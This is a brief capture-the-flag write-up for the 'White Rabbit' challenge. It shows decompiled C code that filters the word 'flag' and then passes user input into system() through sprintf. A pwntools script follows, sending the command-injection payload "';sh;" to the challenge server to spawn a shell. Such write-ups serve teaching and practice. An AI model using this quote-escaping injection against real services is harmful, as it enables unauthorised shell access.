### White Rabbit (100 Points)

> Follow the white rabbit...
>
> [attachment](whiterabbit-cacd63e38e13130a3381342eacfbb623)



After decompiler the main, we saw the “flag” has be filtered. But we can use the command injection in function sprintf !

```c
    puts("Follow the white rabbit.");
    printf("Path to follow: ");
    __isoc99_scanf(0x2032, &var_150h);
    iVar2 = strstr(&var_150h, "flag");
    if (iVar2 != 0) {
        puts("No printing the flag.");
    // WARNING: Subroutine does not return
        exit(0);
    }
    sprintf(&var_110h, "[ -f \'%1$s\' ] && cat \'%1$s\' || echo File does not exist", &var_150h);
    system(&var_110h);
```

#### Exploit script

```python
#!/usr/bin/env python
from pwn import *

payload = "';sh;"

# p = process('./whiterabbit-cacd63e38e13130a3381342eacfbb623')
p = remote('chal.ctf.b01lers.com',1013)
p.sendline(payload)

p.interactive()
```

